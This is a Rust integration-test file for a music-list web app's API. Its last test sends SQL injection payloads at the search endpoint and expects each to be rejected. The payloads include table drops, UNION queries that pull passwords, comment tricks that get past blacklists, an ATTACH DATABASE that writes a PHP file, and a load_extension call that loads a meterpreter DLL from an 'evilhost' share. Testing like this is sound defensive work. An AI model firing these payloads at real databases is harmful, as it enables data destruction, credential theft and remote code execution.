use std::io::Cursor;

use arrow::{array::AsArray, compute, datatypes::UInt64Type, ipc::reader::FileReader};
use zeroflops::{Id, List, ListMode, Lists, Source, SourceType, Spotify};

#[test]
fn test_get_lists() {
    let Some(url) = get_url("/api/lists") else {
        return;
    };
    let lists: Lists = reqwest::blocking::get(url).unwrap().json().unwrap();
    let [ref bop_to_the_top, ref artists, ref winners] = lists.lists[..] else {
        unreachable!()
    };

    assert_bop_to_the_top(bop_to_the_top);
    assert_eq!(
        artists.clone(),
        List {
            user_id: "demo".to_owned(),
            mode: ListMode::View(None),
            name: "Artists".to_owned(),
            sources: Vec::new(),
            iframe: None,
            items: Vec::new(),
            favorite: true,
            query: "SELECT artists, AVG(user_score) FROM item GROUP BY artists".to_owned(),
            ..artists.clone()
        }
    );
    assert_eq!(
        winners.clone(),
        List {
            user_id: "demo".to_owned(),
            mode: ListMode::View(None),
            name: "Winners".to_owned(),
            sources: Vec::new(),
            iframe: None,
            items: Vec::new(),
            favorite: true,
            query: "SELECT name, user_score FROM item WHERE user_score >= 1500".to_owned(),
            ..winners.clone()
        }
    );
}

#[test]
fn test_get_list() {
    let Some(url) = get_url("/api/lists/5MztFbRbMpyxbVYuOSfQV9") else {
        return;
    };
    let list: List = reqwest::blocking::get(url).unwrap().json().unwrap();
    assert_bop_to_the_top(&list);
}

pub fn assert_bop_to_the_top(list: &List) {
    assert_eq!(list.user_id, "demo");
    assert_eq!(list.mode, ListMode::External);
    assert_eq!(list.name, "Bop to the Top");
    assert_eq!(
        list.sources,
        vec![Source {
            source_type: SourceType::Spotify(Spotify::Playlist(Id {
                id: "5MztFbRbMpyxbVYuOSfQV9".to_owned(),
                raw_id: "https://open.spotify.com/embed/playlist/5MztFbRbMpyxbVYuOSfQV9?utm_source=generator".to_owned()
            })),
            name: "Bop to the Top".to_owned()
        }]
    );
    assert_eq!(
        list.iframe,
        Some(
            "https://open.spotify.com/embed/playlist/5MztFbRbMpyxbVYuOSfQV9?utm_source=generator"
                .to_owned()
        )
    );
    assert_eq!(list.items.len(), 10);
    for item in &list.items {
        assert!(item.id.starts_with("spotify:track:"));
        assert!(!item.name.is_empty());
        assert!(item.iframe.is_some());
    }
    assert!(list.favorite);
    assert_eq!(list.query, "SELECT name, user_score FROM item");
}

#[test]
fn test_search() {
    let Some(url) = get_url(
        "/api/items?q=search&query=SELECT%20name,%20user_wins,%20user_losses%20FROM%20item",
    ) else {
        return;
    };
    let items = Cursor::new(reqwest::blocking::get(url).unwrap().bytes().unwrap());
    let mut reader = FileReader::try_new(items, None).unwrap();
    let arrays = reader.next().unwrap().unwrap().columns().to_vec();
    assert_eq!(arrays[0].len(), 10);
    assert!(arrays[0].as_string_opt::<i64>().is_some());
    assert_eq!(arrays[1].len(), 10);
    assert_eq!(arrays[2].len(), 10);
    assert_eq!(
        compute::sum(arrays[1].as_primitive::<UInt64Type>()),
        compute::sum(arrays[2].as_primitive::<UInt64Type>()),
    );
}

#[test]
fn test_sql_injection() {
    for url in [
        // https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
        "/api/items?q=search&query=DROP sampletable;--",
        "/api/items?q=search&query=SELECT * FROM user WHERE user_id = 'admin'--' AND secret = 'password'",
        "/api/items?q=search&query=DROP/*comment*/sampletable",
        "/api/items?q=search&query=DR/**/OP/*bypass blacklisting*/sampletable",
        "/api/items?q=search&query=SELECT/*avoid-spaces*/password/**/FROM/**/Members",
        "/api/items?q=search&query=SELECT * FROM members; DROP members--",
        "/api/items?q=search&query=SELECT * FROM products WHERE id = 10; DROP members--",
        "/api/items?q=search&query=SELECT name, user_wins, user_losses FROM item UNION ALL SELECT * FROM user WHERE user_id = 'admin' AND secret = 'password'",
        "/api/items?q=search&query=insert into users values( 1, 'hax0r', 'coolpass', 9 )/*",
        "/api/items?q=search&query=' + (SELECT TOP 1 password FROM users ) + '",
        // https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
        "/api/items?q=search&query=select sqlite_version()",
        "/api/items?q=search&query=SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'",
        "/api/items?q=search&query=ATTACH DATABASE '/var/www/lol.php' AS lol",
        "/api/items?q=search&query=SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain')",
    ] {
        let Some(url) = get_url(url) else {
            return;
        };
        assert_eq!(reqwest::blocking::get(url).unwrap().status(), 400);
    }
}

fn get_url(path: &str) -> Option<String> {
    std::env::var("TEST_URL").ok().map(|url| url + path)
}
